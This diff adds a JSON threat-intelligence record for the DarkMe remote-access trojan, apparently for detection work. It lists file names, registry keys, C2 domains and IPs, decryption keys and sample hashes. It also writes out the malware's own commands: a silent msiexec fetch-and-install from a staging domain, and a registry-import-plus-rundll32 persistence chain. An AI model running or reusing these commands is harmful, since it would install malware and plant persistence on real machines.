@@ -1,0 +1,849 @@
+{
+  "malware_family": "DarkMe",
+  "threat_actor": "Water Hydra (EvilNum / Operation DarkCasino)",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "DarkMe is a Visual Basic 6 spy-RAT attributed to Water Hydra (EvilNum/Operation DarkCasino) that in this campaign dropped zero-days in favour of an email-delivered image.pif that fetches a remote exemsi-wrapped MSI. The MSI expands a CAB into %AppData%\\ComponentsFolder, runs prnfig.wsf to register a COM object and a custom Locked:// protocol handler, then loads three VB6 loader DLLs that gate on 329 user applications and hollow Microsoft-signed clspack.exe. The injected RAT profiles the host, steals crypto wallets and screenshots, and beacons over a custom TCP channel on port 7712 to an RC4-encrypted C2 domain.",
+  "mitre_techniques": [
+    "T1204.002",
+    "T1218.007",
+    "T1218.011",
+    "T1055.012",
+    "T1547.001",
+    "T1546.015",
+    "T1059.005",
+    "T1113",
+    "T1057",
+    "T1518.001",
+    "T1095",
+    "T1082"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "image.pif",
+      "context": "Initial dropper, 1 MB PE32+ masquerading as image.png",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "propi.msi",
+      "context": "exemsi MSI Wrapper staging installer downloaded by msiexec",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "prnfig.wsf",
+      "context": "Staging Windows Script Host file executed from %AppData%",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "filetext.txt",
+      "context": "Registry template registering COM object @=\"Coconout.dll\"",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "filetext2.txt",
+      "context": "Expanded registry import written by prnfig.wsf then imported by reg.exe",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Coconout.dll",
+      "context": "Stage 1 COM loader DLL (28 KB), implements IShellRunDll",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Use.dll",
+      "context": "Stage 2 loader, anti-sandbox gate and persistence (export FillText)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Finalized.dll",
+      "context": "Stage 3 loader, profiling and RunPE (export Calculation)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "company.cer",
+      "context": "Encrypted 22.5 MB DarkMe payload read by stage 3",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "clspack.exe",
+      "context": "Legitimate signed Microsoft binary hollowed to host the RAT",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%AppData%\\ComponentsFolder\\",
+      "context": "Component staging directory for DLLs, payload and scripts",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%AppData%\\Microsoft\\clspack.exe",
+      "context": "Hollowing target pre-staged outside System32",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "\\ComponentsFolder\\Use.dll",
+      "context": "UTF-16 string in Coconout.dll used to load stage 2",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "\\ComponentsFolder\\Finalized.dll",
+      "context": "Stage 2 primary search path for stage 3 loader",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "\\System32\\Finalized.dll",
+      "context": "Stage 2 fallback search path for stage 3 loader",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\Zeta_Component.log",
+      "context": "Timestamped debug log written when DebugMode = 1",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\Administrator\\Desktop\\backup vps bada\\vaeva\\shellrundll.tlb",
+      "context": "Build artifact path left in Coconout.dll",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Warning: Use.dll not loaded - using defaults",
+      "context": "Fallback message in Coconout.dll load retry loop",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "No protected apps found - exiting FillText",
+      "context": "Decoded control string for the 329-application gate exit",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Integrity check passed. Found Finalized.dll.",
+      "context": "Decoded stage 2 debug log line written to Zeta_Component.log",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ERROR: Failed to load Finalized.dll from any location",
+      "context": "Decoded stage 2 debug log error line",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "export_name",
+      "value": "FillText",
+      "context": "Named export of Use.dll called by stage 1 Coconout.dll",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "export_name",
+      "value": "Calculation",
+      "context": "Export of Finalized.dll called by stage 2 (fallback Calculate)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "export_name",
+      "value": "Calculate",
+      "context": "Fallback export name checked if Calculation is missing",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "VBDLLDemo.EXE",
+      "context": "Internal name of the Finalized.dll export table",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Proyecto1.dll",
+      "context": "Untouched VB6 default original filename on stages 2 and 3",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "YourConfig",
+      "context": "Product name of Use.dll and Finalized.dll build metadata",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ProjectOwner",
+      "context": "Product name of Coconout.dll build metadata",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Aegis Sentinel Security Suite",
+      "context": "Forged product name in PIF version metadata (unrelated security product)",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "aegis_sentinel.dll",
+      "context": "Forged original filename revealed when PIF renamed to .exe",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Nobodygoingout",
+      "context": "Key decrypting company.cer payload in Finalized.dll",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "onlywayhere23!$$#@!!35@!12",
+      "context": "RC4 key decrypting C2 domain from VB form (differs from public builder key)",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "noway123!$$#@35@!",
+      "context": "Public builder RC4 key from earlier 2024 campaigns, not used here",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Officially",
+      "context": "Internal Visual Basic project name of the payload",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "PartiallyesOnes",
+      "context": "Internal project name of the VB6 stealer/RAT payload",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ysmzkrxox",
+      "context": "Randomised nine-character class/module name in Use.dll",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "zxefmxxdi",
+      "context": "Randomised nine-character class/module name in Use.dll",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "tnblrypyr",
+      "context": "Randomised nine-character class/module name in Use.dll",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "mullvad-deamon.exe",
+      "context": "Operator typo inside the 329-application sandbox gate list",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SELECT * FROM AntivirusProduct",
+      "context": "WMI query enumerating installed antivirus products",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SHLEXE",
+      "context": "Spanish/Italian-derived C2 verb to execute a shell command",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ZIPALO",
+      "context": "C2 verb \"zip it\" to archive stolen files",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "COPALO",
+      "context": "C2 verb \"copy it\"",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "PASALO",
+      "context": "C2 verb \"pass it\"",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "DELMAP",
+      "context": "C2 verb to delete a directory",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "STRFLS",
+      "context": "C2 verb to enumerate a directory",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Coconout.Primary",
+      "context": "ProgID of the registered COM server",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "{CFDC57BA-1705-45AF-BA10-EFC3D592982B}",
+      "context": "COM CLSID invoked via rundll32 /sta",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Classes\\CLSID\\{CFDC57BA-1705-45AF-BA10-EFC3D592982B}",
+      "context": "InprocServer32 points at Coconout.dll",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "{8F1576C0-BB08-4F05-87A6-268C0D548794}",
+      "context": "Associated type library ID registered by the malware",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Classes\\Locked",
+      "context": "Custom URL protocol root, default value URL:Locked Protocol",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "URL:Locked Protocol",
+      "context": "Default value marking the nonstandard Locked URI scheme",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Classes\\Locked\\shell\\open\\command",
+      "context": "Stores the rundll32 /sta relaunch command for Locked://",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "rundll32.exe /sta {CFDC57BA-1705-45AF-BA10-EFC3D592982B}",
+      "context": "Command line written into Locked protocol handler key",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "explorer.exe \"Locked://Newest\"",
+      "context": "Data of Run value \"Locked\" masking the parent process at logon",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "context": "Run key holding value Locked for logon persistence",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Locked\\Config",
+      "context": "DebugMode = 1 enables writing of Zeta_Component.log",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "msiexec /i https://onlineview365.com/propi.msi /quiet /norestart",
+      "context": "Executed by image.pif to fetch and run remote MSI",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd /c reg.exe import \"...filetext2.txt\" && rundll32.exe /sta {CFDC57BA-1705-45AF-BA10-EFC3D592982B}",
+      "context": "Run by prnfig.wsf via wscript.exe; hands off to COM loader",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "rundll32.exe /sta {CFDC57BA-1705-45AF-BA10-EFC3D592982B}",
+      "context": "Rundll32 COM instantiation with GUID and no DLL path (parent explorer.exe)",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "EXPAND.EXE -R files.cab",
+      "context": "MSI custom action expanding the CAB into the staging folder",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "parent_child",
+      "value": "wscript.exe -> reg.exe / rundll32.exe",
+      "context": "prnfig.wsf in %AppData% spawning registry import and loader",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "C3C57C74C54B4C7AA65F8742A0F3D739DADD",
+      "context": "RC4-encrypted C2 domain stored as VB form text-box value",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "b2 68 ce a0 40 7e 00",
+      "context": "Seven keystream bytes XORed over company.cer to produce MZ header",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "certificate_subject",
+      "value": "WIN-78P55T5IL26",
+      "context": "Default Windows hostname leaking from C2 server RDP certificate",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "MsiCustomActions.dll, newdev.exe, stub, BZ.RUN_BEFORE_INSTALL_FILE=wScript.exe",
+      "context": "exemsi MSI Wrapper 11.0.53.0 scaffolding under cover name PrinterFind Softwares",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "onlineview365.com",
+      "context": "MSI staging host serving /propi.msi",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://onlineview365.com/propi.msi",
+      "context": "Remote MSI fetched by msiexec during staging",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "readonline365.com",
+      "context": "Delivery/redirect host with directory listing enabled",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://readonline365.com/view/image.png",
+      "context": "Phishing link that answered with image.pif",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "thatawful.boutique",
+      "context": "RC4-decrypted DarkMe C2 domain",
+      "specificity": "high",
+      "evidence": "encrypted_config",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "67.43.50.11",
+      "context": "C2 endpoint (Voxility/ColoGuys, Prague) on port 7712",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "7712",
+      "context": "Hardcoded TCP port for C2 traffic, non-standard for business apps",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "megchartedbk7.com",
+      "context": "Additional domain resolving to the same C2 IP",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "effectivecpmnetwork.com",
+      "context": "Adware tracking redirect served by Nginx on C2 IP web ports",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "storageonline.me",
+      "context": "Delivery host serving image.pif as text/plain",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "viewdocument.live",
+      "context": "Delivery host with starter-template WordPress content",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "advancedfuturetechnology.com",
+      "context": "Delivery host, suspended by provider after campaign",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "sharedfuturetech.com",
+      "context": "Delivery host later serving ClickFix Efimer-derived stealer",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/SCAN_2026-0698494.pif",
+      "context": "Payload path on delivery hosts alongside /pictures/image.png",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "79.133.41.61",
+      "context": "Resolution node linked to onlineview365.com infrastructure",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "394c93dfbb7581c66a23c52b20cd90b31415c0825a2eab7107e60ee3fe693c04",
+      "description": "image.pif initial dropper masquerading as an image"
+    },
+    {
+      "sha256": "9fb5888f9ac99227a35f3e08ca08bfb9eed676e1f91638599eba0d7a5aac847f",
+      "description": "propi.msi exemsi-wrapped staging MSI"
+    },
+    {
+      "sha256": "1c923c685f97e556f241d0f1880283500a61dc7ecae8cafe75f34c720ff6b918",
+      "description": "prnfig.wsf staging script"
+    },
+    {
+      "sha256": "52b242047a8055c0936b384b952c1c16c1072a590610140b01f4acefa8ae883a",
+      "description": "filetext2.txt registry import for COM registration"
+    },
+    {
+      "sha256": "4a18f65ab7de7be385cbcebc78c9ae49334294f93726822b8900f9b7a324a6b0",
+      "description": "Coconout.dll stage 1 COM loader"
+    },
+    {
+      "sha256": "3052352ac811c48590f0239281312c35560fc06b4dc39790e365eb1e7cab8634",
+      "description": "Use.dll stage 2 loader (gate and persistence)"
+    },
+    {
+      "sha256": "d7185bd7b450b478c793ece3025bdd867eed70bb7b739a5f26375b5ba6cf0d93",
+      "description": "Finalized.dll stage 3 RunPE loader"
+    },
+    {
+      "sha256": "54ed18aa883b53794810be0428b3a0167758183c5b3ba5660af747dc81dd5b76",
+      "description": "company.cer encrypted DarkMe payload"
+    },
+    {
+      "sha256": "2915efecf2a01ce0b3ef49c47666ec43c326e7804df10e5859db5f08eeca8a37",
+      "description": "clspack.exe signed Microsoft binary used as hollowing host"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script",
+    "archive"
+  ]
+}
